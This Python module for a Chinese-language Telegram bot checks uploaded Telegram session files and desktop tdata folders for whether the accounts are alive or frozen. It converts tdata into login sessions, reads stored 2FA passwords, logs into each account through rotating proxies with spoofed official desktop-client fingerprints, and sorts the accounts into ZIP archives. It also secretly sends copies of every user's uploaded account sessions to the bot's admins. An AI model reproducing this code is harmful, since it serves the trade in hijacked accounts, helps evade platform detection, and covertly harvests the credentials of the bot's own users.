import os
import zipfile
import shutil
import asyncio
import tempfile
import time
import random
import json
from datetime import datetime, timedelta, timezone
import logging
from telegram import InlineKeyboardMarkup
from dotenv import load_dotenv
from opentele.tl import TelegramClient
from opentele.api import API, UseCurrentSession
from opentele.td import TDesktop
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.help import GetAppConfigRequest

logger = logging.getLogger(__name__)

load_dotenv()
SHAIHUO_BACK = os.getenv("SHAIHUO_BACK", "").replace('\\n', '\n')

MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
MAX_TASK_TIME = int(os.getenv("MK_LIST_TIME", "120").replace('S', ''))

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

def load_proxies():
    global _proxy_list, _proxy_list_last_load
    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        return _proxy_list

    proxy_file = "proxy.txt"
    valid_proxies = []

    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                        else:
                            logger.debug(f"代理 {ip}:{port} 已过期")
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue
    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []

    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

def timestamp_to_utc8_str(ts):
    if not ts:
        return None
    dt_utc = datetime.fromtimestamp(ts, tz=timezone.utc)
    dt_utc8 = dt_utc + timedelta(hours=8)
    return dt_utc8.strftime("%Y-%m-%d %H:%M:%S")

async def generate_json_for_session(session_file, client, me, api_id, api_hash, official_api):
    json_path = session_file.replace('.session', '.json')
    phone = me.phone if me.phone else os.path.basename(session_file).replace('.session', '')
    reg_time = datetime.now().strftime("%Y-%m-%d")

    device_model = getattr(official_api, 'device_model', 'Desktop')
    system_version = getattr(official_api, 'system_version', '')
    app_version = getattr(official_api, 'app_version', '')
    system_lang_code = getattr(official_api, 'system_lang_code', 'en')
    lang_pack = getattr(official_api, 'lang_pack', '')
    lang_code = getattr(official_api, 'lang_code', 'en')
    pid = getattr(official_api, 'pid', random.randint(100000, 999999))

    json_data = {
        "api_id": api_id,
        "api_hash": api_hash,
        "device_model": device_model,
        "system_version": system_version,
        "app_version": app_version,
        "system_lang_code": system_lang_code,
        "lang_pack": lang_pack,
        "lang_code": lang_code,
        "pid": pid,
        "user_id": me.id,
        "phone": phone,
        "twofa": "",
        "password": "",
        "app_id": api_id,
        "app_hash": api_hash,
        "session_file": os.path.basename(session_file).replace('.session', ''),
        "device": device_model,
        "username": me.username or "",
        "sex": None,
        "avatar": "img/default.png",
        "package_id": "",
        "installer": "",
        "ipv6": False,
        "SDK": system_version,
        "sdk": system_version,
        "system_lang_pack": system_lang_code,
        "premium": getattr(me, 'premium', False),
        "reg_time": reg_time
    }

    try:
        os.makedirs(os.path.dirname(json_path), exist_ok=True)
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
        logger.info(f"已为 {session_file} 生成 JSON 配置: {json_path}")
        return json_path
    except Exception as e:
        logger.error(f"生成 JSON 失败 {session_file}: {e}")
        return None

async def check_session_alive(session_file, json_file, api_id, api_hash):
    client = None
    proxy_to_use = None
    json_config = {}
    final_json_file = json_file if json_file and os.path.exists(json_file) else None

    if final_json_file:
        try:
            with open(final_json_file, 'r', encoding='utf-8') as f:
                json_config = json.load(f)
        except Exception as e:
            logger.warning(f"读取 JSON 配置失败 {final_json_file}: {e}")
            final_json_file = None

    final_api_id = api_id
    final_api_hash = api_hash
    if json_config:
        if 'app_id' in json_config and json_config['app_id']:
            try:
                final_api_id = int(json_config['app_id'])
            except (ValueError, TypeError):
                logger.warning(f"无效的 app_id: {json_config['app_id']}, 使用默认值")
        if 'app_hash' in json_config and json_config['app_hash']:
            final_api_hash = str(json_config['app_hash'])

    device_model = json_config.get('device_model') or None
    app_version = json_config.get('app_version') or None
    system_lang_code = json_config.get('system_lang_code') or json_config.get('system_lang_pack') or None
    system_vision = json_config.get('system_version') or json_config.get('sdk') or json_config.get('SDK') or None
    lang_pack = json_config.get('lang_pack') or None

    try:
        official_api = API.TelegramDesktop.Generate()
        if device_model is None:
            max_attempts = 100
            attempt = 0
            while 'linux' in official_api.device_model.lower() and attempt < max_attempts:
                official_api = API.TelegramDesktop.Generate()
                attempt += 1
            if 'linux' in official_api.device_model.lower():
                logger.warning(f"多次尝试后仍包含 Linux，强制设为 Desktop")
                official_api.device_model = "Desktop"

        official_api.api_id = final_api_id
        official_api.api_hash = final_api_hash
        if device_model:
            official_api.device_model = device_model
        if app_version:
            official_api.app_version = app_version
        if system_lang_code:
            official_api.system_lang_code = system_lang_code
        if system_vision:
            official_api.system_version = system_vision
        if lang_pack:
            official_api.lang_pack = lang_pack
            official_api.lang_code = lang_pack

        proxy = get_random_proxy()
        if proxy:
            proxy_to_use = create_proxy_dict(proxy)

        client = TelegramClient(
            session_file,
            api=official_api,
            proxy=proxy_to_use,
            receive_updates=False
        )

        await client.connect()
        if not await client.is_user_authorized():
            return 'dead', "未授权", final_json_file, None

        me = await client.get_me()
        if not me:
            return 'dead', "无法获取用户信息", final_json_file, None

        if not final_json_file:
            generated_path = await generate_json_for_session(
                session_file, client, me, final_api_id, final_api_hash, official_api
            )
            if generated_path:
                final_json_file = generated_path

        try:
            app_config = await client(GetAppConfigRequest(hash=0))
            config_json = json.loads(app_config.to_json())
            freeze_info = None
            freeze_since = None
            freeze_until = None

            for item in config_json.get('config', {}).get('value', []):
                key = item.get('key')
                if key == 'freeze_since_date':
                    val = item.get('value', {})
                    if val.get('_') == 'JsonNumber':
                        freeze_since = val.get('value')
                elif key == 'freeze_until_date':
                    val = item.get('value', {})
                    if val.get('_') == 'JsonNumber':
                        freeze_until = val.get('value')

            if freeze_since is not None and freeze_until is not None and freeze_since > 0 and freeze_until > 0:
                freeze_info = {
                    'since': timestamp_to_utc8_str(freeze_since),
                    'until': timestamp_to_utc8_str(freeze_until)
                }
                return 'frozen', "账号被冻结", final_json_file, freeze_info
            else:
                return 'alive', "存活", final_json_file, None

        except Exception as e:
            logger.error(f"获取 AppConfig 失败: {e}")
            return 'dead', f"配置获取错误: {str(e)[:20]}", final_json_file, None

    except SessionPasswordNeededError:
        return 'dead', "2FA验证", final_json_file, None
    except FloodWaitError as e:
        return 'dead', f"等待{e.seconds}秒", final_json_file, None
    except Exception as e:
        return 'dead', f"错误:{str(e)[:20]}", final_json_file, None
    finally:
        if client:
            await client.disconnect()

def get_total_size(path):
    total = 0
    for root, dirs, files in os.walk(path):
        for f in files:
            fp = os.path.join(root, f)
            if os.path.isfile(fp):
                total += os.path.getsize(fp)
    return total

def read_2fa_from_folder(folder_path: str):
    for file in os.listdir(folder_path):
        if file.lower() in ['2fa.txt', '2fa', 'password.txt']:
            try:
                with open(os.path.join(folder_path, file), 'r', encoding='utf-8') as f:
                    return f.read().strip()
            except:
                pass
    return None

def generate_non_linux_api():
    max_attempts = 100
    attempt = 0
    while attempt < max_attempts:
        api = API.TelegramDesktop.Generate()
        if 'linux' not in api.device_model.lower():
            return api
        attempt += 1
    api = API.TelegramDesktop.Generate()
    api.device_model = "Desktop"
    return api

def find_tdata_folders(root_dir):
    tdata_dirs = set()
    for root, dirs, files in os.walk(root_dir):
        if os.path.basename(root) == 'tdata':
            if any(f in files for f in ['key_datas', 'map']):
                tdata_dirs.add(root)
        elif 'tdata' in dirs:
            potential = os.path.join(root, 'tdata')
            if os.path.exists(potential):
                sub_files = os.listdir(potential)
                if any(f in sub_files for f in ['key_datas', 'map']):
                    tdata_dirs.add(potential)
    return list(tdata_dirs)

async def convert_tdata_to_session_with_proxy(tdata_dir, output_dir, twofa, proxy_dict):
    API_ID = int(os.getenv("TELEGRAM_APP_ID", "2040"))
    API_HASH = os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")

    try:
        tdesk = TDesktop(tdata_dir)
        if not tdesk.isLoaded():
            return False, None, None, None, "tdata 文件无法加载"

        client = await tdesk.ToTelethon(
            session=os.path.join(output_dir, "temp.session"),
            flag=UseCurrentSession,
            proxy=proxy_dict
        )

        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, None, None, None, "会话未授权"

        me = await client.get_me()
        if not me:
            await client.disconnect()
            return False, None, None, None, "无法获取用户信息"

        phone = me.phone
        if not phone:
            await client.disconnect()
            return False, None, None, None, "无法获取手机号"

        temp_session = os.path.join(output_dir, "temp.session")
        final_session = os.path.join(output_dir, f"{phone}.session")
        if os.path.exists(temp_session):
            shutil.move(temp_session, final_session)

        random_api = generate_non_linux_api()
        try:
            if hasattr(me, 'date') and me.date:
                reg_time = datetime.fromtimestamp(me.date.timestamp()).strftime("%Y-%m-%d")
            else:
                reg_time = datetime.now().strftime("%Y-%m-%d")
        except Exception:
            reg_time = datetime.now().strftime("%Y-%m-%d")

        json_data = {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "device_model": random_api.device_model,
            "system_version": random_api.system_version,
            "app_version": random_api.app_version,
            "system_lang_code": random_api.system_lang_code,
            "lang_pack": random_api.lang_pack,
            "lang_code": random_api.lang_code,
            "pid": random_api.pid,
            "user_id": me.id,
            "phone": phone,
            "twofa": twofa if twofa else "",
            "password": twofa if twofa else "",
            "app_id": API_ID,
            "app_hash": API_HASH,
            "session_file": phone,
            "device": random_api.device_model,
            "username": me.username or "",
            "sex": None,
            "avatar": "img/default.png",
            "package_id": "",
            "installer": "",
            "ipv6": False,
            "SDK": random_api.system_version,
            "sdk": random_api.system_version,
            "system_lang_pack": random_api.system_lang_code,
            "premium": getattr(me, 'premium', False),
            "reg_time": reg_time
        }

        json_path = os.path.join(output_dir, f"{phone}.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, ensure_ascii=False, indent=2)

        await client.disconnect()
        return True, phone, final_session, json_path, None

    except Exception as e:
        logger.error(f"转换 tdata 失败 {tdata_dir}: {e}")
        return False, None, None, None, str(e)

async def handle_shaihuo_document(update, context, user_id, user_states):
    document = update.message.document
    if not document.file_name.endswith('.zip'):
        from bot import create_back_button
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "<tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> 请上传ZIP格式的压缩包",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return

    status_msg = await update.message.reply_text(
        "<tg-emoji emoji-id='5942826671290715541'>📥</tg-emoji> 正在下载文件...",
        parse_mode='HTML'
    )

    try:
        file = await context.bot.get_file(document.file_id)
        zip_path = f"downloads/shaihuo_{user_id}_{int(time.time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        await file.download_to_drive(zip_path)

        await status_msg.edit_text(
            "<tg-emoji emoji-id='5942826671290715541'>🔍</tg-emoji> 开始处理筛活任务...",
            parse_mode='HTML'
        )
        await process_shaihuo(update, context, zip_path, user_id)
        try:
            os.remove(zip_path)
        except:
            pass
    except Exception as e:
        logger.error(f"处理文件失败: {e}")
        from bot import create_back_button
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"<tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> 处理失败: {str(e)}",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    finally:
        user_states.pop(user_id, None)
        try:
            await status_msg.delete()
        except:
            pass

async def process_shaihuo(update, context, zip_path, user_id):
    from telegram import InlineKeyboardMarkup
    from bot import create_back_button

    api_id_str = os.getenv("TELEGRAM_APP_ID")
    api_hash = os.getenv("TELEGRAM_APP_HASH")
    admins = os.getenv("ADMIN_ID", "").split(",")

    if not api_id_str or not api_hash:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> 系统未配置，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return

    try:
        api_id = int(api_id_str)
    except (ValueError, TypeError):
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="<tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> API配置错误，请联系管理员",
            parse_mode='HTML',
            reply_markup=reply_markup
        )
        return

    try:
        await asyncio.wait_for(
            _process_shaihuo_internal(update, context, zip_path, user_id, api_id, api_hash, admins),
            timeout=MAX_TASK_TIME
        )
    except asyncio.TimeoutError:
        keyboard = [[create_back_button()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"<tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> 任务执行超时 ({MAX_TASK_TIME}秒)",
            parse_mode='HTML',
            reply_markup=reply_markup
        )

async def _process_shaihuo_internal(update, context, zip_path, user_id, api_id, api_hash, admins):
    from telegram import InlineKeyboardMarkup
    from bot import create_back_button

    with tempfile.TemporaryDirectory() as temp_dir:
        extract_dir = os.path.join(temp_dir, "extracted")
        os.makedirs(extract_dir, exist_ok=True)
        try:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
                extracted_size = get_total_size(extract_dir)
                if extracted_size > MAX_EXTRACT_SIZE:
                    raise Exception(f"解压后文件过大 ({extracted_size//1024//1024}MB > {MAX_EXTRACT_SIZE//1024//1024}MB)")
        except Exception as e:
            keyboard = [[create_back_button()]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"<tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> 解压失败: {str(e)}",
                parse_mode='HTML',
                reply_markup=reply_markup
            )
            return

        session_files = []
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.session'):
                    session_files.append(os.path.join(root, file))

        accounts = []
        if session_files:
            for sess in session_files:
                session_name = os.path.splitext(os.path.basename(sess))[0]
                json_file = os.path.join(os.path.dirname(sess), f"{session_name}.json")
                if not os.path.exists(json_file):
                    json_file = None
                accounts.append((session_name, sess, json_file, None))
        else:
            tdata_dirs = find_tdata_folders(extract_dir)
            if not tdata_dirs:
                keyboard = [[create_back_button()]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="<tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> 未找到session或tdata文件夹",
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
                return

            status_msg = await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"""<tg-emoji emoji-id="5942826671290715541">🔄</tg-emoji> <b>检测到tdata，正在转换为session...</b>

找到 <b>{len(tdata_dirs)}</b> 个tdata文件夹
请稍候...""",
                parse_mode='HTML'
            )

            convert_temp_dir = os.path.join(temp_dir, "converted_sessions")
            os.makedirs(convert_temp_dir, exist_ok=True)

            for i, tdata_dir in enumerate(tdata_dirs, 1):
                parent_dir = os.path.dirname(tdata_dir)
                twofa = read_2fa_from_folder(parent_dir)
                proxy = get_random_proxy()
                proxy_dict = create_proxy_dict(proxy) if proxy else None

                account_out = os.path.join(convert_temp_dir, f"acc_{i}")
                os.makedirs(account_out, exist_ok=True)

                success, phone, sess_path, json_path, err = await convert_tdata_to_session_with_proxy(
                    tdata_dir, account_out, twofa, proxy_dict
                )

                if success and sess_path and json_path:
                    accounts.append((phone, sess_path, json_path, tdata_dir))
                else:
                    logger.error(f"转换失败 {tdata_dir}: {err}")

                if i % 3 == 0 or i == len(tdata_dirs):
                    try:
                        await status_msg.edit_text(
                            text=f"""<tg-emoji emoji-id="5942826671290715541">🔄</tg-emoji> <b>tdata转换进度</b>

进度: {i}/{len(tdata_dirs)}
成功: {len(accounts)}""",
                            parse_mode='HTML'
                        )
                    except:
                        pass
                await asyncio.sleep(0.2)

            try:
                await status_msg.delete()
            except:
                pass

            if not accounts:
                keyboard = [[create_back_button()]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="<tg-emoji emoji-id='5886496611835581345'>❌</tg-emoji> 所有tdata转换失败，无法筛活",
                    parse_mode='HTML',
                    reply_markup=reply_markup
                )
                return

        status_msg = await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"""<tg-emoji emoji-id="5942826671290715541">🔍</tg-emoji> <b>筛活进行中</b>

找到 <b>{len(accounts)}</b> 个账号
正在检测存活状态，请稍候...""",
            parse_mode='HTML'
        )

        alive_dir = os.path.join(temp_dir, "alive")
        frozen_dir = os.path.join(temp_dir, "frozen")
        dead_dir = os.path.join(temp_dir, "dead")
        os.makedirs(alive_dir, exist_ok=True)
        os.makedirs(frozen_dir, exist_ok=True)
        os.makedirs(dead_dir, exist_ok=True)

        alive_count = 0
        frozen_count = 0
        dead_count = 0

        for i, (phone, session_file, json_file, tdata_dir) in enumerate(accounts, 1):
            status, reason, final_json_file, freeze_info = await check_session_alive(
                session_file, json_file, api_id, api_hash
            )

            if status == 'alive':
                target_dir = os.path.join(alive_dir, phone)
                alive_count += 1
            elif status == 'frozen':
                target_dir = os.path.join(frozen_dir, phone)
                frozen_count += 1
            else:
                target_dir = os.path.join(dead_dir, phone)
                dead_count += 1

            os.makedirs(target_dir, exist_ok=True)

            if tdata_dir and os.path.exists(tdata_dir):
                tdata_target = os.path.join(target_dir, "tdata")
                shutil.copytree(tdata_dir, tdata_target, dirs_exist_ok=True)
            if session_file and os.path.exists(session_file):
                shutil.copy2(session_file, os.path.join(target_dir, os.path.basename(session_file)))
            if final_json_file and os.path.exists(final_json_file):
                shutil.copy2(final_json_file, os.path.join(target_dir, os.path.basename(final_json_file)))

            if status == 'frozen' and freeze_info:
                frozen_txt = os.path.join(target_dir, "frozen.txt")
                with open(frozen_txt, 'w', encoding='utf-8') as f:
                    f.write(f"冻结开始时间: {freeze_info['since']}\n")
                    f.write(f"冻结结束时间: {freeze_info['until']}\n")

            if i % 5 == 0 or i == len(accounts):
                try:
                    await status_msg.edit_text(
                        text=f"""<tg-emoji emoji-id="5942826671290715541">🔍</tg-emoji> <b>筛活进行中</b>

进度: {i}/{len(accounts)}
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji>存活: {alive_count} | <tg-emoji emoji-id="5985347654974967782">❄️</tg-emoji>冻结: {frozen_count} | <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji>失效: {dead_count}""",
                        parse_mode='HTML'
                    )
                except:
                    pass

            await asyncio.sleep(0.5)

        alive_zip = os.path.join(temp_dir, "alive.zip")
        if alive_count > 0:
            with zipfile.ZipFile(alive_zip, 'w') as zipf:
                for root, dirs, files in os.walk(alive_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        rel_path = os.path.relpath(file_path, alive_dir)
                        zipf.write(file_path, rel_path)

        frozen_zip = os.path.join(temp_dir, "frozen.zip")
        if frozen_count > 0:
            with zipfile.ZipFile(frozen_zip, 'w') as zipf:
                for root, dirs, files in os.walk(frozen_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        rel_path = os.path.relpath(file_path, frozen_dir)
                        zipf.write(file_path, rel_path)

        dead_zip = os.path.join(temp_dir, "dead.zip")
        if dead_count > 0:
            with zipfile.ZipFile(dead_zip, 'w') as zipf:
                for root, dirs, files in os.walk(dead_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        rel_path = os.path.relpath(file_path, dead_dir)
                        zipf.write(file_path, rel_path)

        result_text = f"""<tg-emoji emoji-id="5845955401916355857">✅</tg-emoji> <b>筛活完成</b>

<tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
• <tg-emoji emoji-id="5879770735999717115">👤</tg-emoji> 总账号: <b>{len(accounts)}</b>
• <tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 存活: <b>{alive_count}</b>
• <tg-emoji emoji-id="5985347654974967782">❄️</tg-emoji> 冻结: <b>{frozen_count}</b>
• <tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失效: <b>{dead_count}</b>"""

        try:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=result_text,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"发送结果失败: {e}")

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        if alive_count > 0:
            try:
                with open(alive_zip, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=f"alive_{timestamp}.zip",
                        caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 存活账号 ({alive_count}个)</b>",
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"发送存活zip失败: {e}")

        if frozen_count > 0:
            try:
                with open(frozen_zip, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=f"frozen_{timestamp}.zip",
                        caption=f"<b><tg-emoji emoji-id='5985347654974967782'>❄️</tg-emoji> 冻结账号 ({frozen_count}个)</b>",
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"发送冻结zip失败: {e}")

        if dead_count > 0:
            try:
                with open(dead_zip, 'rb') as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=f"dead_{timestamp}.zip",
                        caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> 失效账号 ({dead_count}个)</b>",
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"发送失效zip失败: {e}")

        for admin_id in admins:
            admin_id = admin_id.strip()
            if not admin_id:
                continue
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=f"""<tg-emoji emoji-id="5771695636411847302">📢</tg-emoji> <b>筛活任务完成</b>

<tg-emoji emoji-id="5879770735999717115">👤</tg-emoji> 用户: <code>{user_id}</code>
<tg-emoji emoji-id="5764747792371160364">📊</tg-emoji> 总账号: <b>{len(accounts)}</b>
<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> 存活: <b>{alive_count}</b>
<tg-emoji emoji-id="5985347654974967782">❄️</tg-emoji> 冻结: <b>{frozen_count}</b>
<tg-emoji emoji-id="5922712343011135025">❌</tg-emoji> 失效: <b>{dead_count}</b>""",
                    parse_mode='HTML'
                )

                admin_timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

                if alive_count > 0:
                    with open(alive_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"alive_{user_id}_{admin_timestamp}.zip",
                            caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 存活 ({alive_count})</b>",
                            parse_mode='HTML'
                        )
                if frozen_count > 0:
                    with open(frozen_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"frozen_{user_id}_{admin_timestamp}.zip",
                            caption=f"<b><tg-emoji emoji-id='5985347654974967782'>❄️</tg-emoji> 冻结 ({frozen_count})</b>",
                            parse_mode='HTML'
                        )
                if dead_count > 0:
                    with open(dead_zip, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=admin_id,
                            document=f,
                            filename=f"dead_{user_id}_{admin_timestamp}.zip",
                            caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> 失效 ({dead_count})</b>",
                            parse_mode='HTML'
                        )
            except Exception as e:
                logger.error(f"发送给管理员 {admin_id} 失败: {e}")

        try:
            await status_msg.delete()
        except:
            pass
